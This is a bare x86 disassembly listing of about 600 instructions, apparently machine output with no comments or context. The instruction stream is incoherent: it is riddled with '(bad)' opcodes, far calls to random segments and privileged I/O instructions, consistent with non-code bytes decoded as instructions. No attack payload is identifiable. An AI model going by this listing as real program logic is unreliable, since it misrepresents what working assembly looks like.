  43c67a:	mov    bl,BYTE PTR [edi-0x7]
  43c67d:	or     edi,DWORD PTR [esi-0x6dff7b83]
  43c683:	out    dx,al
  43c684:	loopne 0x43c66e
  43c686:	call   0xd8f0:0xfec5cf4d
  43c68d:	mov    WORD PTR [ecx],cs
  43c68f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c690:	jbe    0x43c64e
  43c692:	test   DWORD PTR [ebx-0x63],edi
  43c695:	inc    ebp
  43c696:	add    eax,0x8816b2db
  43c69b:	jmp    0xb94:0x4eba7f09
  43c6a2:	(bad)  
  43c6a3:	fcomip st,st(5)
  43c6a5:	xchg   esi,eax
  43c6a6:	ins    DWORD PTR es:[edi],dx
  43c6a7:	out    dx,al
  43c6a8:	out    0xec,eax
  43c6aa:	call   0x34d9:0x9fc5af04
  43c6b1:	out    0x93,eax
  43c6b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c6b4:	mov    esi,0xf21a679f
  43c6b9:	mov    cl,0x3
  43c6bb:	arpl   WORD PTR [edx-0x76dad45e],si
  43c6c1:	ret    0x40c9
  43c6c4:	arpl   WORD PTR [ebx],cx
  43c6c6:	mov    ecx,DWORD PTR [edi]
  43c6c8:	leave  
  43c6c9:	cs stos DWORD PTR es:[edi],eax
  43c6cb:	pop    ebx
  43c6cc:	cmp    eax,DWORD PTR [eax]
  43c6ce:	jecxz  0x43c72c
  43c6d0:	mov    dl,0xa0
  43c6d2:	scas   al,BYTE PTR es:[edi]
  43c6d3:	push   edi
  43c6d4:	pop    edx
  43c6d5:	cmp    ebp,esi
  43c6d7:	mov    esi,0x7a2b0460
  43c6dc:	sahf   
  43c6dd:	es mov edx,0xe6ca2b69
  43c6e3:	adc    eax,0x3b9eceb2
  43c6e8:	(bad)  
  43c6e9:	cld    
  43c6ea:	mov    edx,0x140bcf8f
  43c6ef:	jae    0x43c70d
  43c6f1:	int    0xb0
  43c6f3:	add    eax,0x4d9a866e
  43c6f8:	push   0x1a
  43c6fa:	fwait
  43c6fb:	jecxz  0x43c6fe
  43c6fd:	cmp    BYTE PTR [esi],al
  43c6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c700:	push   ss
  43c701:	inc    edx
  43c702:	es mov cl,0x54
  43c705:	pop    ecx
  43c706:	adc    al,BYTE PTR [ebx+0x49]
  43c709:	popa   
  43c70a:	call   0x5831:0x219fbda4
  43c711:	dec    ecx
  43c712:	fild   QWORD PTR [ecx-0x2dbe1b3b]
  43c718:	jb     0x43c6d1
  43c71a:	les    esi,FWORD PTR [eax-0x7778c064]
  43c720:	sub    eax,DWORD PTR [ebp+0x1a]
  43c723:	in     al,dx
  43c724:	and    DWORD PTR [ebx+0x72325c02],esi
  43c72a:	repnz mov edx,0x67319ffa
  43c730:	loop   0x43c799
  43c732:	lods   al,BYTE PTR ds:[esi]
  43c733:	push   ss
  43c734:	pop    ebx
  43c735:	lods   eax,DWORD PTR ds:[esi]
  43c736:	(bad)  
  43c737:	mov    esi,0x10510b5e
  43c73c:	push   0xd0cdbaeb
  43c741:	or     al,0xbc
  43c743:	fwait
  43c744:	inc    esp
  43c745:	jmp    0xd349:0x24dd97ab
  43c74c:	mov    dl,0x25
  43c74e:	pop    esp
  43c74f:	pop    ds
  43c750:	cmp    ah,cl
  43c752:	shl    ebp,cl
  43c754:	xchg   esp,eax
  43c755:	or     al,0x21
  43c757:	xor    eax,0x87fb504c
  43c75c:	jne    0x43c6de
  43c75e:	jae    0x43c70d
  43c760:	mov    bl,0x5a
  43c762:	and    eax,0xc56ea999
  43c767:	sbb    ebx,DWORD PTR [edx+0x3e]
  43c76a:	cmp    DWORD PTR [esp-0x2b6e955f],esp
  43c771:	sbb    edx,DWORD PTR [ebx]
  43c773:	push   ebx
  43c774:	mov    cl,0xcb
  43c776:	rol    DWORD PTR [eax-0x4e],0xea
  43c77a:	pop    ds
  43c77b:	lock jns 0x43c790
  43c77e:	clc    
  43c77f:	push   ecx
  43c780:	in     al,0xb
  43c782:	dec    esi
  43c783:	pop    edx
  43c784:	mov    ds:0x1cc6d209,eax
  43c789:	pop    eax
  43c78a:	jle    0x43c7bd
  43c78c:	mov    dl,0x49
  43c78e:	jl     0x43c7c6
  43c790:	sbb    cl,BYTE PTR [esp+edx*1-0x43]
  43c794:	js     0x43c79e
  43c796:	mov    ecx,0xa4074b7e
  43c79b:	xor    ch,BYTE PTR [ebx]
  43c79d:	vxorpd xmm3,xmm5,XMMWORD PTR [edi-0x28d365f6]
  43c7a5:	sub    bl,BYTE PTR [eax-0x7a76bf8b]
  43c7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c7ac:	lock jae 0x43c785
  43c7af:	push   ecx
  43c7b0:	jecxz  0x43c74e
  43c7b2:	sub    al,0xd1
  43c7b4:	mov    WORD PTR [edx+eiz*1-0x551777dd],fs
  43c7bb:	gs jb  0x43c784
  43c7be:	imul   eax,DWORD PTR [ebx],0x8c820c12
  43c7c4:	pop    ecx
  43c7c5:	xor    cl,bl
  43c7c7:	xchg   edi,eax
  43c7c8:	xchg   esp,eax
  43c7c9:	mov    ch,0x54
  43c7cb:	push   esi
  43c7cc:	mov    dl,0xa7
  43c7ce:	rol    DWORD PTR [esi+0x4d934bc6],0xdd
  43c7d5:	or     esi,DWORD PTR [esi+0x2bf83243]
  43c7db:	test   DWORD PTR [ecx+0x44],esp
  43c7de:	arpl   WORD PTR [ebx-0x7],bx
  43c7e1:	mov    ds:0xdf0e509a,eax
  43c7e6:	xchg   esi,eax
  43c7e7:	add    al,0xc8
  43c7e9:	xor    al,0xd3
  43c7eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c7ec:	mov    edx,0xa0660282
  43c7f1:	pop    esi
  43c7f2:	sub    al,0x59
  43c7f4:	mov    dl,0xc5
  43c7f6:	rol    DWORD PTR [edi],0xa6
  43c7f9:	mov    bl,0x6d
  43c7fb:	cmc    
  43c7fc:	int3   
  43c7fd:	or     esi,DWORD PTR [ebx-0x344e5bf6]
  43c803:	xchg   DWORD PTR [ebp+0xdcc99ed],ebx
  43c809:	push   es
  43c80a:	adc    BYTE PTR [ebx],dh
  43c80c:	sub    esi,DWORD PTR [ebx+0x1877e27a]
  43c812:	das    
  43c813:	add    cl,BYTE PTR [esi+0x4b976a0b]
  43c819:	arpl   WORD PTR [ebx],di
  43c81b:	scas   eax,DWORD PTR es:[edi]
  43c81c:	mov    dl,0xe2
  43c81e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c81f:	popf   
  43c820:	loope  0x43c84a
  43c822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c823:	jge    0x43c873
  43c825:	or     eax,DWORD PTR [edi+esi*2-0x9]
  43c829:	xor    dl,BYTE PTR [ecx+0x39]
  43c82c:	out    0x72,al
  43c82e:	call   0x6ec4:0xa13dfb97
  43c835:	mov    ds:0x3515d1e2,al
  43c83a:	shl    esi,0xb5
  43c83d:	std    
  43c83e:	inc    ebx
  43c83f:	aaa    
  43c840:	bound  edi,QWORD PTR [eax+0x55]
  43c843:	mov    eax,0x4d3b9d22
  43c848:	mov    dl,0xa2
  43c84a:	add    al,0xd4
  43c84c:	sbb    BYTE PTR [ecx-0x10],0x30
  43c850:	mov    edi,0xcd80470b
  43c855:	sti    
  43c856:	mov    ch,0xed
  43c858:	inc    ebx
  43c859:	mov    ch,0x5a
  43c85b:	xor    eax,0xc826345a
  43c860:	add    ecx,DWORD PTR [ebx]
  43c862:	pop    ebp
  43c863:	jo     0x43c852
  43c865:	xor    BYTE PTR ds:0x7b129d26,bh
  43c86b:	xlat   BYTE PTR ds:[ebx]
  43c86c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c86d:	add    al,0x9a
  43c86f:	aad    0xa3
  43c871:	push   edx
  43c872:	dec    eax
  43c873:	push   cs
  43c874:	mov    eax,ds:0xeea5deb6
  43c879:	call   0x40489035
  43c87e:	sbb    bl,BYTE PTR [edi]
  43c880:	push   edi
  43c881:	popf   
  43c882:	and    DWORD PTR [edi+0x6aa1d2b2],eax
  43c888:	imul   esi,ecx,0xb39638d
  43c88e:	cmp    al,bh
  43c890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c892:	ja     0x43c874
  43c894:	xor    al,0x14
  43c896:	call   0x48ad:0x840ae719
  43c89d:	int3   
  43c89e:	out    0xa7,eax
  43c8a0:	jo     0x43c8ef
  43c8a2:	mov    ss,WORD PTR ss:0xb11a9519
  43c8a9:	in     al,dx
  43c8aa:	loopne 0x43c8ae
  43c8ac:	das    
  43c8ad:	mov    al,0xaf
  43c8af:	push   edi
  43c8b0:	nop
  43c8b1:	addr16 out 0xa7,eax
  43c8b4:	dec    ecx
  43c8b5:	push   0x71
  43c8b7:	xor    dh,bh
  43c8b9:	dec    ebx
  43c8ba:	bound  esp,QWORD PTR ds:0x275fad8f
  43c8c0:	mov    bl,0x9a
  43c8c2:	aam    0x59
  43c8c4:	leave  
  43c8c5:	pop    ds
  43c8c6:	jae    0x43c89f
  43c8c8:	fidiv  WORD PTR [esi-0x27]
  43c8cb:	mov    al,ds:0x14977fac
  43c8d0:	push   ds
  43c8d1:	sbb    al,0xb4
  43c8d3:	xchg   edi,eax
  43c8d4:	inc    ecx
  43c8d5:	push   esp
  43c8d6:	mul    DWORD PTR [ecx+0x19bd9cb2]
  43c8dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c8dd:	stos   BYTE PTR es:[edi],al
  43c8de:	in     eax,0x1b
  43c8e0:	push   ss
  43c8e1:	or     ecx,DWORD PTR [edi]
  43c8e3:	add    DWORD PTR [ebp+0x7a],esi
  43c8e6:	shl    BYTE PTR [edx-0x7d434b4d],0x55
  43c8ed:	out    dx,eax
  43c8ee:	call   0x6f1f:0x66c802d0
  43c8f5:	add    DWORD PTR [edi+0x6ebd7cb8],edx
  43c8fb:	mov    ds:0x6079af8d,eax
  43c900:	rep lods al,BYTE PTR ds:[esi]
  43c902:	lea    esp,[edi+0x5dc2b8a2]
  43c908:	mov    dl,0x37
  43c90a:	cmp    dl,bl
  43c90c:	cmc    
  43c90d:	and    eax,0xb6f0522
  43c912:	lock sub DWORD PTR ss:[ebx],eax
  43c916:	fld    DWORD PTR [esi+0x6a9954e8]
  43c91c:	stos   BYTE PTR es:[edi],al
  43c91d:	(bad)  [eax+0x60b29c8e]
  43c923:	fsubr  QWORD PTR [esi+0x3a]
  43c926:	mov    cl,0xa7
  43c928:	xchg   ecx,eax
  43c929:	pop    esi
  43c92a:	mov    eax,ds:0x4df46c0d
  43c92f:	push   esp
  43c930:	mov    dl,0x66
  43c932:	add    DWORD PTR [ebx+0x28c7b6f4],ecx
  43c938:	xor    BYTE PTR [ebx],cl
  43c93a:	(bad)  
  43c93b:	lock (bad) 
  43c93d:	xchg   esi,eax
  43c93e:	and    BYTE PTR [ebx-0x4c1ed24c],ah
  43c944:	mov    al,0xc
  43c946:	mov    esi,0x3ad80c3e
  43c94b:	in     al,0xeb
  43c94d:	mov    ah,0xca
  43c94f:	imul   edx,DWORD PTR [esi-0x27],0xfc179ba7
  43c956:	sbb    cl,al
  43c958:	repz xchg edi,eax
  43c95a:	xor    eax,0x9abeffb7
  43c95f:	mov    cl,0x2
  43c961:	ficomp DWORD PTR [ebx-0x7f]
  43c964:	jle    0x43c970
  43c966:	mov    bh,0xa5
  43c968:	scas   al,BYTE PTR es:[edi]
  43c969:	imul   esp,DWORD PTR [ebp-0x591b567],0x9af2b7a1
  43c973:	push   ebp
  43c974:	ja     0x43c91f
  43c976:	or     esi,eax
  43c978:	sbb    ebx,ebx
  43c97a:	fisub  DWORD PTR [edi-0x20dc3c4a]
  43c980:	icebp  
  43c981:	mov    ebx,0x7c2a2f6f
  43c986:	in     eax,dx
  43c987:	sub    DWORD PTR [edx+0x495b3fc],esi
  43c98d:	jmp    0x43c9cb
  43c98f:	iret   
  43c990:	xor    eax,0xf8260a0b
  43c995:	es pusha 
  43c997:	dec    ebx
  43c998:	pop    edi
  43c999:	loopne 0x43c935
  43c99b:	loope  0x43c9fe
  43c99d:	adc    al,0x1
  43c99f:	sti    
  43c9a0:	ror    BYTE PTR [edi-0x37],cl
  43c9a3:	pop    ds
  43c9a4:	dec    ebp
  43c9a5:	or     ecx,DWORD PTR [edi+0x62a64caa]
  43c9ab:	mov    ds:0xd29ac57d,eax
  43c9b0:	xchg   edx,eax
  43c9b1:	outs   dx,DWORD PTR ds:[esi]
  43c9b2:	pop    edi
  43c9b3:	outs   dx,DWORD PTR ds:[esi]
  43c9b4:	outs   dx,BYTE PTR ds:[esi]
  43c9b5:	sbb    BYTE PTR [eax-0x60],dl
  43c9b8:	push   esp
  43c9b9:	and    DWORD PTR [eax+edi*8],ebx
  43c9bc:	pop    ss
  43c9bd:	retf   
  43c9be:	imul   DWORD PTR [ecx]
  43c9c0:	cmp    BYTE PTR [esi-0x37b4ea66],dl
  43c9c6:	bound  esp,QWORD PTR [esi-0x76]
  43c9c9:	shl    DWORD PTR ss:[edi-0x415266d6],0xa8
  43c9d1:	xchg   ebp,eax
  43c9d2:	aad    0x81
  43c9d4:	mov    bl,0x6d
  43c9d6:	hlt    
  43c9d7:	pop    ss
  43c9d8:	pop    ecx
  43c9d9:	mov    ah,0xd1
  43c9db:	out    dx,eax
  43c9dc:	pushf  
  43c9dd:	sti    
  43c9de:	xchg   ecx,eax
  43c9df:	fcmovb st,st(2)
  43c9e1:	cld    
  43c9e2:	cdq    
  43c9e3:	data16 mov al,0x54
  43c9e6:	push   edx
  43c9e7:	dec    edi
  43c9e8:	push   ecx
  43c9e9:	cli    
  43c9ea:	ror    DWORD PTR [esi+0x56],cl
  43c9ed:	sub    al,0xbb
  43c9ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c9f0:	dec    ebp
  43c9f1:	sbb    al,bh
  43c9f3:	pop    esp
  43c9f4:	mov    ch,0xb7
  43c9f6:	lods   al,BYTE PTR ds:[esi]
  43c9f7:	(bad)  
  43c9f8:	mov    dl,0xda
  43c9fa:	cmp    al,BYTE PTR [ecx-0x5d947fc8]
  43ca00:	add    BYTE PTR [ebx],cl
  43ca02:	call   0x3c263d39
  43ca07:	loope  0x43ca3d
  43ca09:	imul   ebx,DWORD PTR [edx-0x34b83807],0xffffffce
  43ca10:	cmc    
  43ca11:	and    BYTE PTR [ebx],0xa7
  43ca14:	lds    ecx,FWORD PTR [esi]
  43ca16:	popa   
  43ca17:	add    bl,BYTE PTR [eax+0x2]
  43ca1a:	sub    ebp,eax
  43ca1c:	mov    bl,0xc4
  43ca1e:	not    DWORD PTR [esi-0x1f5d9f6c]
  43ca24:	idiv   BYTE PTR [edx+0x56ba6e1a]
  43ca2a:	xor    BYTE PTR [eax+edi*8-0x5e58962b],bl
  43ca31:	cdq    
  43ca32:	dec    esi
  43ca33:	sub    ch,BYTE PTR [eax-0x3b]
  43ca36:	adc    dl,bh
  43ca38:	mov    dl,0x8e
  43ca3a:	xchg   ecx,eax
  43ca3b:	(bad)
  43ca3e:	dec    edx
  43ca3f:	and    eax,0x85360bdf
  43ca44:	cmp    BYTE PTR [ebp-0x316fd1],cl
  43ca4a:	call   0x92bc:0x4d8088b6
  43ca51:	std    
  43ca52:	xchg   ecx,eax
  43ca53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ca54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ca55:	jae    0x43ca7d
  43ca57:	aaa    
  43ca58:	les    esi,FWORD PTR ds:0xafb5fce8
  43ca5e:	xor    al,0xc5
  43ca60:	sub    DWORD PTR [edx],0xf7fac76b
  43ca66:	jb     0x43ca51
  43ca68:	cs adc eax,0xcb8a8b7b
  43ca6e:	jmp    0xb2ba:0xf5b607e4
  43ca75:	sar    BYTE PTR [eax-0x4d],0xbb
  43ca79:	icebp  
  43ca7a:	xchg   BYTE PTR [eax-0x63],ah
  43ca7d:	or     ebx,DWORD PTR [esi+0x1ca8ccd8]
  43ca83:	adc    ebx,DWORD PTR [edx+0x4a]
  43ca86:	call   0x6d827c4a
  43ca8b:	fs in  eax,dx
  43ca8d:	sbb    dh,ch
  43ca8f:	aas    
  43ca90:	icebp  
  43ca91:	xchg   edi,eax
  43ca92:	jbe    0x43cae1
  43ca94:	sbb    ecx,DWORD PTR [edx]
  43ca96:	stc    
  43ca97:	sbb    bh,BYTE PTR [edx+ebx*2-0x69f5f]
  43ca9e:	dec    ecx
  43ca9f:	dec    ebp
  43caa0:	mov    dl,0x6f
  43caa2:	cmp    ebx,DWORD PTR [esi+0x54]
  43caa5:	test   BYTE PTR [esi-0x31],ah
  43caa8:	test   BYTE PTR [ebx],cl
  43caaa:	and    al,0xea
  43caac:	int    0xe0
  43caae:	mov    al,0x55
  43cab0:	push   ecx
  43cab1:	xchg   DWORD PTR ds:[edi-0x65],esi
  43cab5:	gs inc ebp
  43cab7:	push   es
  43cab8:	xor    cl,BYTE PTR [eax+edi*8+0x5]
  43cabc:	je     0x43cb2d
  43cabe:	popa   
  43cabf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cac0:	pop    es
  43cac1:	push   esp
  43cac2:	ss xchg ebp,eax
  43cac4:	aad    0xf4
  43cac6:	ins    DWORD PTR es:[edi],dx
  43cac7:	test   BYTE PTR [edx-0xf],bl
  43caca:	call   0xc29d:0x8fbb1797
  43cad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cad2:	xchg   ecx,eax
  43cad3:	push   ebp
  43cad4:	data16 or cl,BYTE PTR [ecx+0x3d]
  43cad8:	ja     0x43ca60
  43cada:	adc    al,0x1e
  43cadc:	call   0x9d3e:0x487877f3
  43cae3:	cmp    DWORD PTR [esp+ebp*4-0x3f],esp
  43cae7:	fbstp  TBYTE PTR [ebp-0x20]
  43caea:	mov    bh,BYTE PTR [ecx+ecx*4+0x13a92080]
  43caf1:	sbb    eax,0x139292f7
  43caf6:	sbb    dl,BYTE PTR [ebx+ecx*8]
  43caf9:	xchg   esp,eax
  43cafa:	call   0x35e2:0x38474191
  43cb01:	loop   0x43cb60
  43cb03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cb04:	(bad)  
  43cb05:	mov    ebx,0x8259a5ee
  43cb0a:	inc    esp
  43cb0b:	jg     0x43cadb
  43cb0d:	mov    ebp,0xc89890b4
  43cb12:	call   0xa5e7:0x844d2edd
  43cb19:	or     edx,DWORD PTR [esi]
  43cb1b:	iret   
  43cb1c:	push   ds
  43cb1d:	or     BYTE PTR [edi+ebx*1],al
  43cb20:	(bad)  
  43cb21:	fcomp  DWORD PTR [edx+0x6dc6bdbe]
  43cb27:	rol    BYTE PTR [edi],1
  43cb29:	sahf   
  43cb2a:	cmp    BYTE PTR [edi+0x1b],bl
  43cb2d:	or     ebp,DWORD PTR [eax-0x6f211e06]
  43cb33:	push   DWORD PTR [eax-0x4d9d13d3]
  43cb39:	aaa    
  43cb3a:	push   ebp
  43cb3b:	sbb    BYTE PTR [ebx+0x6],dh
  43cb3e:	cmc    
  43cb3f:	aaa    
  43cb40:	sbb    DWORD PTR [ebx],ecx
  43cb42:	mov    ecx,0x96f0a301
  43cb47:	in     al,dx
  43cb48:	imul   eax,DWORD PTR [ebp-0x66],0x5f
  43cb4c:	fs cmp edx,ecx
  43cb4f:	jae    0x43cb69
  43cb51:	or     BYTE PTR [edx],cl
  43cb53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cb54:	arpl   ax,ax
  43cb56:	add    eax,DWORD PTR [esi-0x2ac66a32]
  43cb5c:	inc    ebx
  43cb5d:	out    dx,eax
  43cb5e:	mov    bh,ch
  43cb60:	inc    edi
  43cb61:	imul   ecx,DWORD PTR [ebp+0x6f74b505],0x12
  43cb68:	sti    
  43cb69:	xlat   BYTE PTR ds:[ebx]
  43cb6a:	or     ah,BYTE PTR [ebx+ebx*1-0x52]
  43cb6e:	pop    ebx
  43cb6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cb70:	scas   eax,DWORD PTR es:[edi]
  43cb71:	stmxcsr DWORD PTR [edi]
  43cb74:	rcr    BYTE PTR [edx+0x60b23d77],1
  43cb7a:	cmp    ah,BYTE PTR [edx-0x20]
  43cb7d:	mov    al,ds:0xb3c147a
  43cb82:	or     ah,ch
  43cb84:	sbb    esp,DWORD PTR [ecx+0x79f4efbb]
  43cb8a:	jb     0x43cb9b
  43cb8c:	mov    dl,0xda
  43cb8e:	outs   dx,BYTE PTR ds:[esi]
  43cb8f:	xchg   DWORD PTR [ecx-0x51],esp
  43cb92:	sbb    edi,ebx
  43cb94:	daa    
  43cb95:	or     eax,DWORD PTR [eax+esi*1]
  43cb98:	shl    DWORD PTR [ecx-0x2349c5e6],cl
  43cb9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cb9f:	aaa    
  43cba0:	nop
  43cba1:	or     ecx,DWORD PTR [ecx-0x1a8fdea6]
  43cba7:	cmc    
  43cba8:	lahf   
  43cba9:	or     ebx,DWORD PTR [ecx-0x701fc6b8]
  43cbaf:	and    esi,DWORD PTR [edx+ecx*2-0x66]
  43cbb3:	in     eax,0x6b
  43cbb5:	dec    ebx
  43cbb6:	and    DWORD PTR [ebx-0x5df2b867],0xffffffd1
  43cbbd:	loop   0x43cb48
  43cbbf:	xchg   ebx,eax
  43cbc0:	ror    BYTE PTR [ebx-0x1b27fb7d],cl
  43cbc6:	call   0xf36c:0x9d0a34ad
  43cbcd:	xor    al,0xec
  43cbcf:	mov    eax,0xe41123eb
  43cbd4:	sbb    eax,0x2b6cde5
  43cbd9:	stc    
  43cbda:	and    ebx,DWORD PTR [ebx-0x6f65eafe]
  43cbe0:	mov    edi,0x16a1ae8a
  43cbe5:	(bad)  
  43cbe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cbe8:	jmp    FWORD PTR [eax-0x23]
  43cbeb:	pop    edx
  43cbec:	out    dx,al
  43cbed:	mov    dl,0x9e
  43cbf0:	(bad)  
  43cbf1:	lods   al,BYTE PTR ds:[esi]
  43cbf2:	neg    BYTE PTR [edx]
  43cbf4:	dec    ecx
  43cbf5:	mov    esi,DWORD PTR [edi]
  43cbf7:	fstp   DWORD PTR [ebx]
  43cbf9:	or     al,0x17
  43cbfb:	inc    ebx
  43cbfc:	xor    ecx,DWORD PTR [ebx]
  43cbfe:	mov    eax,0x72bb516e
  43cc03:	ss xchg edi,eax
  43cc05:	aam    0x9a
  43cc07:	push   ds
  43cc08:	cwde   
  43cc09:	icebp  
  43cc0a:	jno    0x43cbd9
  43cc0c:	popa   
  43cc0d:	sub    eax,0x9d8da46d
  43cc12:	mov    DWORD PTR [edi],ecx
  43cc14:	jg     0x43cbdb
  43cc16:	test   DWORD PTR [ebx+0x4f5a7da3],esp
  43cc1c:	pop    ss
  43cc1d:	lea    esp,ds:0x940b045a
  43cc23:	push   edx
  43cc24:	cli    
  43cc25:	jno    0x43cbcf
  43cc27:	nop
  43cc28:	xchg   ebp,eax
  43cc29:	fcomp  DWORD PTR [edx+0x5cd00c7]
  43cc2f:	and    DWORD PTR [edi+edi*2-0x9a1587b],esp
  43cc36:	pushf  
  43cc37:	jb     0x43cc18
  43cc39:	inc    eax
  43cc3a:	daa    
  43cc3b:	sub    al,0xbd
  43cc3d:	mov    es,WORD PTR [edx+0x2be258]
  43cc43:	test   BYTE PTR [eax],cl
  43cc45:	and    al,0xb
  43cc47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cc48:	push   0x79
  43cc4a:	sub    esi,edx
  43cc4c:	in     eax,0x56
  43cc4e:	xchg   bl,bl
  43cc50:	(bad)  
  43cc51:	iret   
  43cc52:	frstor [edi]
  43cc54:	adc    eax,0x5d1a5d2c
  43cc59:	sub    dl,BYTE PTR [ecx-0x48]
  43cc5c:	and    eax,0x9e70ff4f
  43cc61:	or     esp,DWORD PTR [edi]
  43cc63:	ds sbb eax,0xb20676f5
  43cc69:	lea    esi,[ecx+eiz*8-0x65]
  43cc6d:	(bad)  
  43cc6e:	fisubr DWORD PTR [edx+ebp*8]
  43cc71:	or     edi,DWORD PTR [ebx+ebp*4]
  43cc74:	repz jp 0x43ccd4
  43cc77:	gs out dx,al
  43cc79:	add    BYTE PTR [edx-0x4a6fe2eb],bl
  43cc7f:	push   cs
  43cc80:	push   es
  43cc81:	aad    0x11
  43cc83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cc84:	into   
  43cc85:	push   esi
  43cc86:	sbb    ch,BYTE PTR [esi+0x47]
  43cc89:	cdq    
  43cc8a:	sub    eax,0xfb3b236
  43cc8f:	je     0x43cc61
  43cc91:	mov    DWORD PTR [eax+0x140baa4e],ebp
  43cc97:	test   edx,edx
  43cc99:	rol    DWORD PTR [ecx-0x47],0xe4
  43cc9d:	sbb    eax,0x31b7f49a
  43cca2:	jle    0x43ccda
  43cca4:	push   ecx
  43cca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cca6:	cmp    ah,BYTE PTR [edi-0x1deb9f47]
  43ccac:	xor    cl,BYTE PTR [ebp+0x5c401633]
  43ccb2:	call   0x1595:0x5e2d6e54
  43ccb9:	pop    es
  43ccba:	inc    ecx
  43ccbb:	pop    ds
  43ccbc:	popa   
  43ccbd:	xchg   ebx,eax
  43ccbe:	ins    DWORD PTR es:[edi],dx
  43ccbf:	test   eax,0xd4158f7f
  43ccc4:	xor    ch,dh
  43ccc6:	aas    
  43ccc7:	mov    bl,0xa1
  43ccc9:	dec    eax
  43ccca:	ins    BYTE PTR es:[edi],dx
  43cccb:	pop    ebp
  43cccc:	mov    dl,0x9
  43ccce:	mov    ah,0xfb
  43ccd0:	stos   DWORD PTR es:[edi],eax
  43ccd1:	push   ebp
  43ccd2:	cld    
  43ccd3:	je     0x43ccb0
  43ccd5:	sub    eax,0xb13c712
  43ccda:	mov    al,ds:0x4c404c61
  43ccdf:	fidiv  WORD PTR [edx-0x48f9477f]
  43cce5:	sbb    dl,bl
  43cce7:	mov    ecx,0x66610cdd
  43ccec:	jl     0x43cd55
  43ccee:	pusha  
  43ccef:	or     al,0x32
  43ccf1:	pop    edi
  43ccf2:	xchg   BYTE PTR [ecx-0x7c65ed20],ch
  43ccf8:	in     eax,dx
  43ccf9:	jbe    0x43cd31
  43ccfb:	xchg   edi,eax
  43ccfc:	mov    WORD PTR [edx+0x21],?
  43ccff:	aaa    
  43cd00:	jns    0x43cd0d
  43cd02:	lahf   
  43cd03:	push   eax
  43cd04:	gs inc eax
  43cd06:	sub    DWORD PTR [ecx],ecx
  43cd08:	mov    edx,0x7fb9a1c
  43cd0d:	mov    bh,0x53
  43cd0f:	ins    BYTE PTR es:[edi],dx
  43cd10:	jmp    0x58ecd97c
  43cd15:	or     BYTE PTR [ecx],ah
  43cd17:	jmp    0x76e0571
  43cd1c:	xchg   cl,ch
  43cd1e:	cld    
  43cd1f:	aas    
  43cd20:	lods   eax,DWORD PTR ds:[esi]
  43cd21:	or     DWORD PTR [edx],ecx
  43cd23:	inc    ebx
  43cd24:	mov    dl,0x2
  43cd26:	icebp  
  43cd27:	hlt    
  43cd28:	pop    edx
  43cd29:	xchg   edi,eax
  43cd2a:	fisttp DWORD PTR [edi-0x70]
  43cd2d:	jle    0x43ccf5
  43cd2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cd30:	xor    eax,0x69956a4b
  43cd35:	mov    ds:0x1a7d5b81,al
  43cd3a:	popf   
  43cd3b:	add    cl,BYTE PTR [ecx]
  43cd3d:	push   cs
  43cd3e:	inc    ebp
  43cd3f:	pushf  
  43cd40:	sub    BYTE PTR [edx+0x16be36f6],0x60
  43cd47:	add    DWORD PTR [edx],0x678e990b
  43cd4d:	neg    BYTE PTR [esi+edi*1]
  43cd50:	lods   al,BYTE PTR ds:[esi]
  43cd51:	sub    BYTE PTR [ebp-0x1d0d86d8],cl
  43cd57:	daa    
  43cd58:	pop    esp
  43cd59:	call   0x73bd95b1
  43cd5e:	add    BYTE PTR [edi-0x1f03878d],ah
  43cd64:	push   ebx
  43cd65:	xchg   esi,eax
  43cd66:	aaa    
  43cd67:	in     eax,dx
  43cd68:	mov    dl,0x83
  43cd6a:	inc    ebp
  43cd6b:	adc    DWORD PTR [ecx-0x361a1395],esp
  43cd71:	push   ebx
  43cd72:	aas    
  43cd73:	lock mov dl,0x15
  43cd76:	xor    DWORD PTR [edi],eax
  43cd78:	loop   0x43cd8d
  43cd7a:	mov    ah,0x3d
  43cd7c:	mov    dl,0x41
  43cd7e:	push   cs
  43cd7f:	fisttp DWORD PTR [eax+0x38]
  43cd82:	lea    edi,[eax+ebx*2]
  43cd85:	adc    al,0xa2
  43cd87:	mov    BYTE PTR [edi+eiz*1],ah
  43cd8a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cd8c:	rcr    DWORD PTR [eax+0x46],0x29
  43cd90:	bound  eax,QWORD PTR [ecx-0x2c4deb63]
  43cd96:	outs   dx,BYTE PTR ds:[esi]
  43cd97:	and    DWORD PTR [eax+0x5dc5f36a],esi
  43cd9d:	or     esi,DWORD PTR [esi+0x33f725ad]
  43cda3:	or     DWORD PTR [ebp-0x49],esp
  43cda6:	call   0x549f:0xc7cdd925
  43cdad:	out    dx,al
  43cdae:	xor    eax,0x4f433ca7
  43cdb3:	sbb    BYTE PTR [edi-0x3f],dh
  43cdb6:	cld    
  43cdb7:	stos   DWORD PTR es:[edi],eax
  43cdb8:	mov    dl,0xdb
  43cdba:	mov    BYTE PTR [ebx+0x34],cl
